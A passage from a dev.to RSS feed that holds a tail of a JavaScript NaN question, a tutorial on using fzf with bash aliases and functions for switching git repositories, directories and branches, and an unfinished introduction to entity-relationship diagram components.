      &lt;a href="https://twitter.com/intent/tweet?in_reply_to=1400498933554683904" class="ltag__twitter-tweet__actions__button"&gt;
        &lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--fFnoeFxk--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev.to/assets/twitter-reply-action-238fe0a37991706a6880ed13941c3efd6b371e4aefe288fe8e0db85250708bc4.svg" alt="Twitter reply action"&gt;
      &lt;/a&gt;
      &lt;a href="https://twitter.com/intent/retweet?tweet_id=1400498933554683904" class="ltag__twitter-tweet__actions__button"&gt;
        &lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--k6dcrOn8--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev.to/assets/twitter-retweet-action-632c83532a4e7de573c5c08dbb090ee18b348b13e2793175fea914827bc42046.svg" alt="Twitter retweet action"&gt;
      &lt;/a&gt;
      &lt;a href="https://twitter.com/intent/like?tweet_id=1400498933554683904" class="ltag__twitter-tweet__actions__button"&gt;
        &lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--SRQc9lOp--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev.to/assets/twitter-like-action-1ea89f4b87c7d37465b0eb78d51fcb7fe6c03a089805d7ea014ba71365be5171.svg" alt="Twitter like action"&gt;
      &lt;/a&gt;
    &lt;/div&gt;
  &lt;/div&gt;
&lt;/blockquote&gt;


&lt;p&gt;Does anyone know why this is? My only guess is that maybe there is a &lt;code&gt;Symbol&lt;/code&gt; that indicates &lt;code&gt;NaN&lt;/code&gt; is unique even though &lt;code&gt;NaN !== NaN&lt;/code&gt;.&lt;/p&gt;

</description>
      <category>discuss</category>
      <category>help</category>
      <category>javascript</category>
    </item>
    <item>
      <title>Make fzf your best friend inside terminal</title>
      <author>chinmay chhajed</author>
      <pubDate>Sat, 05 Jun 2021 11:56:28 +0000</pubDate>
      <link>https://dev.to/chhajedji/make-fzf-your-best-friend-inside-terminal-iod</link>
      <guid>https://dev.to/chhajedji/make-fzf-your-best-friend-inside-terminal-iod</guid>
      <description>&lt;p&gt;&lt;a href="https://github.com/junegunn/fzf"&gt;Fuzzy finder&lt;/a&gt; is one of the best tool which you can use for speeding up your daily terminal work flow. In my daily workflow, I have integrated &lt;code&gt;fzf&lt;/code&gt; in most of the tasks where I have many choices and have to choose one among them, whether be it changing a git branch, searching and opening a file, changing directory or changing a project.&lt;/p&gt;

&lt;p&gt;Let's get started to exploit some features of &lt;code&gt;fzf&lt;/code&gt; 😈&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#install"&gt;
  &lt;/a&gt;
  Install
&lt;/h2&gt;

&lt;p&gt;Probably your &lt;a href="https://github.com/junegunn/fzf#using-linux-package-managers"&gt;package manager already has it&lt;/a&gt;. If it doesn't, don't worry, just clone the git repo and run the &lt;code&gt;install&lt;/code&gt; script as directed &lt;a href="https://github.com/junegunn/fzf#using-git"&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;You can check if the installation has been successful by running the command &lt;code&gt;whereis fzf&lt;/code&gt;. You should see the location of binary.&lt;/p&gt;

&lt;p&gt;Make sure to read the &lt;code&gt;README.md&lt;/code&gt; from the project's Github. It explains &lt;code&gt;fzf&lt;/code&gt; and some of it's usage quite well. Specially the &lt;a href="https://github.com/junegunn/fzf#key-bindings-for-command-line"&gt;key-binding&lt;/a&gt; part, where you can map &lt;code&gt;Ctrl-t&lt;/code&gt; to paste the selected files and directories onto the command-line, &lt;code&gt;Alt-c&lt;/code&gt; for changing directories and &lt;code&gt;Ctrl-r&lt;/code&gt; for fuzzy reverse searching. Also if you happen to use &lt;code&gt;vim&lt;/code&gt;, you may check the &lt;a href="https://github.com/junegunn/fzf#vim-plugin"&gt;vim extension&lt;/a&gt; for same.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#some-other-usage"&gt;
  &lt;/a&gt;
  Some other usage
&lt;/h2&gt;

&lt;h3&gt;
  &lt;a href="#changing-git-projects"&gt;
  &lt;/a&gt;
  Changing git projects
&lt;/h3&gt;

&lt;p&gt;Add the following alias in your bashrc:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight shell"&gt;&lt;code&gt;&lt;span class="c"&gt;# Find and save location of all git repositories present in $HOME.&lt;/span&gt;
&lt;span class="c"&gt;# Try using `fd', if not installed then use default `find'.&lt;/span&gt;
&lt;span class="nb"&gt;alias &lt;/span&gt;&lt;span class="nv"&gt;repoup&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;"fd -HI ^&lt;/span&gt;&lt;span class="se"&gt;\.&lt;/span&gt;&lt;span class="s2"&gt;git&lt;/span&gt;&lt;span class="nv"&gt;$ $HOME&lt;/span&gt;&lt;span class="s2"&gt; 2&amp;gt;/dev/null &amp;gt; &lt;/span&gt;&lt;span class="nv"&gt;$HOME&lt;/span&gt;&lt;span class="s2"&gt;/.tmp/gitfiles || find &lt;/span&gt;&lt;span class="nv"&gt;$HOME&lt;/span&gt;&lt;span class="s2"&gt;/ -regex .*/&lt;/span&gt;&lt;span class="se"&gt;\.&lt;/span&gt;&lt;span class="s2"&gt;git&lt;/span&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;&lt;span class="s2"&gt;2&amp;gt;/dev/null &amp;gt; &lt;/span&gt;&lt;span class="nv"&gt;$HOME&lt;/span&gt;&lt;span class="s2"&gt;/.tmp/gitfiles"&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;blockquote&gt;
&lt;p&gt;If you happen to use &lt;code&gt;fd&lt;/code&gt; (&lt;a href="https://dev.to/chhajedji/why-to-find-files-when-you-can-fd-them-26ej"&gt;which definitely you should&lt;/a&gt;), this command will be completed in a wink.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Executing this alias will use search path of all git repositories stored inside &lt;code&gt;HOME&lt;/code&gt; and list them in file at &lt;code&gt;~/.tmp/gitfiles&lt;/code&gt;. This file will be further used with &lt;code&gt;fzf&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Make sure to execute this alias whenever you add a new git repository in your system. This will update the paths of all git repositories, specially the newly added one.&lt;/p&gt;

&lt;p&gt;Next, add this function in your bashrc file:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight shell"&gt;&lt;code&gt;gotoprj&lt;span class="o"&gt;()&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
    &lt;span class="nv"&gt;REPOS&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;"&lt;/span&gt;&lt;span class="si"&gt;$(&lt;/span&gt;&lt;span class="nb"&gt;cat&lt;/span&gt; &lt;span class="nv"&gt;$HOME&lt;/span&gt;/.tmp/gitfiles | xargs &lt;span class="nb"&gt;dirname&lt;/span&gt;  | &lt;span class="nb"&gt;sed &lt;/span&gt;s:/home/&lt;span class="nv"&gt;$USER&lt;/span&gt;:~: | fzf&lt;span class="si"&gt;)&lt;/span&gt;&lt;span class="s2"&gt;"&lt;/span&gt;

&lt;span class="c"&gt;# Cut the '~/' part from the `REPOS'.&lt;/span&gt;
        &lt;span class="nv"&gt;REPOS&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;"&lt;/span&gt;&lt;span class="si"&gt;$(&lt;/span&gt;&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="nv"&gt;$REPOS&lt;/span&gt; | &lt;span class="nb"&gt;cut&lt;/span&gt; &lt;span class="nt"&gt;-d&lt;/span&gt; &lt;span class="s1"&gt;'/'&lt;/span&gt; &lt;span class="nt"&gt;-f2-&lt;/span&gt;&lt;span class="si"&gt;)&lt;/span&gt;&lt;span class="s2"&gt;"&lt;/span&gt;

&lt;span class="c"&gt;# If user selected any repo then open `$TERMINAL' in that repo.&lt;/span&gt;
        &lt;span class="o"&gt;[&lt;/span&gt; &lt;span class="s2"&gt;"&lt;/span&gt;&lt;span class="nv"&gt;$REPOS&lt;/span&gt;&lt;span class="s2"&gt;"&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;""&lt;/span&gt; &lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;||&lt;/span&gt; &lt;span class="nb"&gt;cd&lt;/span&gt; &lt;span class="nv"&gt;$HOME&lt;/span&gt;/&lt;span class="nv"&gt;$REPOS&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;This will list all the git repositories present in our database created in last step (&lt;code&gt;~/.tmp/gitfiles&lt;/code&gt;) , and change current directory to that repository.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#switch-to-any-directory"&gt;
  &lt;/a&gt;
  Switch to any directory
&lt;/h3&gt;

&lt;p&gt;As simple as said in title, from any current directory, switch to any directory in you system by just typing the keywords you remember specific to target directory. Have this function in your bashrc:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight shell"&gt;&lt;code&gt;sd&lt;span class="o"&gt;()&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
    &lt;span class="nv"&gt;TARGET&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;"&lt;/span&gt;&lt;span class="si"&gt;$(&lt;/span&gt;&lt;span class="o"&gt;{&lt;/span&gt; fd &lt;span class="nb"&gt;.&lt;/span&gt; &lt;span class="nv"&gt;$HOME&lt;/span&gt; &lt;span class="nt"&gt;--type&lt;/span&gt; directory &lt;span class="nt"&gt;-HI&lt;/span&gt; 2&amp;gt;/dev/null &lt;span class="o"&gt;||&lt;/span&gt; find &lt;span class="nv"&gt;$HOME&lt;/span&gt; &lt;span class="nt"&gt;-type&lt;/span&gt; d 2&amp;gt;/dev/null&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="o"&gt;}&lt;/span&gt; | fzf&lt;span class="si"&gt;)&lt;/span&gt;&lt;span class="s2"&gt;"&lt;/span&gt;
        &lt;span class="o"&gt;[&lt;/span&gt; &lt;span class="nt"&gt;-n&lt;/span&gt; &lt;span class="s2"&gt;"&lt;/span&gt;&lt;span class="nv"&gt;$TARGET&lt;/span&gt;&lt;span class="s2"&gt;"&lt;/span&gt; &lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="nb"&gt;cd&lt;/span&gt; &lt;span class="s2"&gt;"&lt;/span&gt;&lt;span class="nv"&gt;$TARGET&lt;/span&gt;&lt;span class="s2"&gt;"&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="nb"&gt;ls&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Now whenever you want to go to any directory, instead of giving it's full path, just hit &lt;code&gt;sd&lt;/code&gt; and give the directory name and few unique words in it's path, and Tada 🎉! No need to enter that ugly full path.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#change-git-branch"&gt;
  &lt;/a&gt;
  Change git branch
&lt;/h3&gt;

&lt;p&gt;Many times it happens that I forget the branch name I want to switch to. Again, doing it with &lt;code&gt;fzf&lt;/code&gt; saves the pain for searching the branch name. What can be done is add following section in your gitconfig file which should be present at &lt;code&gt;$HOME/.gitconfig&lt;/code&gt;.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight conf"&gt;&lt;code&gt;[&lt;span class="n"&gt;alias&lt;/span&gt;]
    ; &lt;span class="n"&gt;switch&lt;/span&gt; &lt;span class="n"&gt;git&lt;/span&gt; &lt;span class="n"&gt;local&lt;/span&gt; &lt;span class="n"&gt;branches&lt;/span&gt; &lt;span class="n"&gt;using&lt;/span&gt; &lt;span class="n"&gt;fzf&lt;/span&gt;
    &lt;span class="n"&gt;sb&lt;/span&gt;=&lt;span class="s2"&gt;"!switch_branch_fzf() { git branch | fzf | xargs git checkout; }; switch_branch_fzf"&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;blockquote&gt;
&lt;p&gt;Note that since we are using &lt;code&gt;git branch&lt;/code&gt;, it will only list the branches you have previously checked out. New branches will not appear in the finder.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4&gt;
  &lt;a href="#usage"&gt;
  &lt;/a&gt;
  Usage
&lt;/h4&gt;



&lt;p&gt;&lt;code&gt;git sb&lt;/code&gt;&lt;br&gt;
&lt;/p&gt;

&lt;p&gt;This will list all the git branches in &lt;code&gt;fzf&lt;/code&gt; and now we can search for the target branch with ease.&lt;/p&gt;

&lt;p&gt;Once you get the idea of using the fuzzy finder, you can modify it to find anything which you need to search on regular basis. For example, if you have a location where you store all the scripts which you edit frequently, you can have a function to list all of them into &lt;code&gt;fzf&lt;/code&gt; and then open the selected one in your editor. These were just some of the exploits I use. If you have anything more to suggest, add it in the comments.&lt;/p&gt;

</description>
      <category>linux</category>
      <category>terminal</category>
      <category>shell</category>
      <category>productivity</category>
    </item>
    <item>
      <title>Entity-Relationship Diagram</title>
      <author>hebaShakeel</author>
      <pubDate>Sat, 05 Jun 2021 11:44:37 +0000</pubDate>
      <link>https://dev.to/hebashakeel/entity-relationship-diagram-3jh</link>
      <guid>https://dev.to/hebashakeel/entity-relationship-diagram-3jh</guid>
      <description>&lt;p&gt;It is a high level data model diagram which defines the conceptual view of the database. It indicates the relation among entities.&lt;br&gt;
Before making the actual database, first the ER-diagram is drawn to show the relations and many more things.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Components of ER Diagram:&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;1) Entity&lt;/strong&gt;&lt;br&gt;
i) It is a real-world object.&lt;br&gt;
ii) It can be physical.&lt;br&gt;
iii) It can be logical. &lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Entity Set&lt;/strong&gt; - It is a set (or collection) of entities of the same type which share the similar properties or attributes.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;An entity can be characterized into two types:&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;i) Strong Entity&lt;/strong&gt; -&lt;br&gt;
-&amp;gt; It has a Primary Key.&lt;br&gt;
-&amp;gt; It is not dependent.&lt;br&gt;
-&amp;gt; They are shown in single rectangle&lt;br&gt;
&lt;strong&gt;ii) Weak Entity&lt;/strong&gt; - &lt;br&gt;
-&amp;gt; It doesn't have the sufficient attributes to form Primary Key.&lt;br&gt;
-&amp;gt; It is dependent on the Strong Entity.&lt;br&gt;
-&amp;gt; They are shown in double Rectangle.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Example&lt;/strong&gt;&lt;br&gt;
&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--K12x2B7Z--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/xdmpsu8wk0c9u4dvc8fb.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--K12x2B7Z--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/xdmpsu8wk0c9u4dvc8fb.png" alt="Alt Text"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Total Participation&lt;/strong&gt; - Weak Entity always has total participation with the Relationship. This means that each entity in the entity set must compulsorily participate in at least one relationship instance in that relationship set.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;2) Attributes&lt;/strong&gt; - They are the properties that describe the entity.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;An attribute can be characterized into:&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;1) Simple Attributes:&lt;/strong&gt; They are represented by oval.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Example&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--fPgeZbEs--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/9ds2kv7b3qxi200ktw78.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--fPgeZbEs--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/9ds2kv7b3qxi200ktw78.png" alt="Alt Text"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;2) Multi-valued Attributes:&lt;/strong&gt; Multiple values for a single attribute. They are represented by double oval.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Example&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--xd6mKsvz--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/uqr3pickbhr7yn5028dp.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--xd6mKsvz--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/uqr3pickbhr7yn5028dp.png" alt="Alt Text"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;3) Single-Valued Attributes:&lt;/strong&gt; Each and every entity will have only one value.&lt;br&gt;
&lt;strong&gt;Example&lt;/strong&gt; - ID&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;4) Composite Attributes:&lt;/strong&gt; Those attributes that can be divided further.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Example&lt;/strong&gt;&lt;br&gt;
&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--D2Wzo55b--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/n2npqhfjv7i8s9qlw8ex.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--D2Wzo55b--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/n2npqhfjv7i8s9qlw8ex.png" alt="Alt Text"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;5) Derived Attributes:&lt;/strong&gt; Those attributes whose values are derived from another attribute. They are represented by dotted oval.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Example&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--DJTvs6dM--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/t90qaescirb65ji94h2y.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--DJTvs6dM--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/t90qaescirb65ji94h2y.png" alt="Alt Text"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Age is a derived attribute since age can be derived from the Date of Birth.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;6) Key Attribute:&lt;/strong&gt; Attribute which can uniquely define the whole tuple is called a Key Attribute.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Example&lt;/strong&gt;- ID&lt;br&gt;
&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--qMvFBDDk--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/q319zng3m8t6i3tz5qvb.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--qMvFBDDk--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/q319zng3m8t6i3tz5qvb.png" alt="Alt Text"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;3) Relationship&lt;/strong&gt;&lt;br&gt;
It indicates how each and every entity is related with every other entity.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Degree of Relationship:&lt;/strong&gt; A relationship where a number of different entity set participate is called as degree of a relationship.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Degree of relationship can be categorized into the following types:&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;1) Unary&lt;/strong&gt; - Only one Entity set participates in a relationship.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Example&lt;/strong&gt;&lt;br&gt;
&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--WDqlBGcI--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/6qq1eyfi3552nsgzgu21.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--WDqlBGcI--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/6qq1eyfi3552nsgzgu21.png" alt="Alt Text"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;2) Binary&lt;/strong&gt; - Two Entity Sets participate in a relationship.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Example&lt;/strong&gt;&lt;br&gt;
&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--FcovQUSw--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/deoyrprq9y0om6re6kuc.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--FcovQUSw--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/deoyrprq9y0om6re6kuc.png" alt="Alt Text"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;It is further divided into four types:&lt;br&gt;
&lt;strong&gt;i) One-to-One:&lt;/strong&gt;&lt;br&gt;
&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--FcovQUSw--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/deoyrprq9y0om6re6kuc.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--FcovQUSw--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/deoyrprq9y0om6re6kuc.png" alt="Alt Text"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;ii) One-to-Many:&lt;/strong&gt;&lt;br&gt;
&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--Af_FJwAW--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/g4apt41dt4snydomuchk.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--Af_FJwAW--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/g4apt41dt4snydomuchk.png" alt="Alt Text"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;iii) Many-to-One:&lt;/strong&gt;&lt;br&gt;
&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--JiwvbMMw--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/rtpzf4hz3rpjig61btcx.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--JiwvbMMw--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/rtpzf4hz3rpjig61btcx.png" alt="Alt Text"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;iv) Many-to-Many:&lt;/strong&gt;&lt;br&gt;
&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--bFOay-Y9--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/atqcu2c8dg0bi1e6ycll.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--bFOay-Y9--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/atqcu2c8dg0bi1e6ycll.png" alt="Alt Text"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;3) Ternary&lt;/strong&gt; - When three entity sets participate in a relationship.&lt;br&gt;
&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--wTRptQOg--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/eixexawkf2o93u6hzt2p.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--wTRptQOg--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/eixexawkf2o93u6hzt2p.png" alt="Alt Text"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;4) n-ary&lt;/strong&gt; - When more than three entity set involves in a relationship, it is called &lt;strong&gt;n-ary relationship&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Summary of ER-Diagram Symbols&lt;/strong&gt;&lt;br&gt;
1) Entity or Strong Entity:&lt;br&gt;
&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--q8C1HJ7---/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/gpts8dv15vbulbujx7ku.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--q8C1HJ7---/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/gpts8dv15vbulbujx7ku.png" alt="Alt Text"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;2) Weak Entity:&lt;br&gt;
&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--cuztCABZ--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/5nhrzuztb0qghbig8gwu.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--cuztCABZ--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/5nhrzuztb0qghbig8gwu.png" alt="Alt Text"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;3) Attribute:&lt;br&gt;
&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--DuhgRrHQ--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/ogtg2c83cqjk2xboj4v5.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--DuhgRrHQ--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/ogtg2c83cqjk2xboj4v5.png" alt="Alt Text"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;4) Multi-valued Attribute:&lt;br&gt;
&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--kRhsXCvF--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/4vx9phpeyuugwzw2xt04.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--kRhsXCvF--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/4vx9phpeyuugwzw2xt04.png" alt="Alt Text"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;5) Relationship:&lt;br&gt;
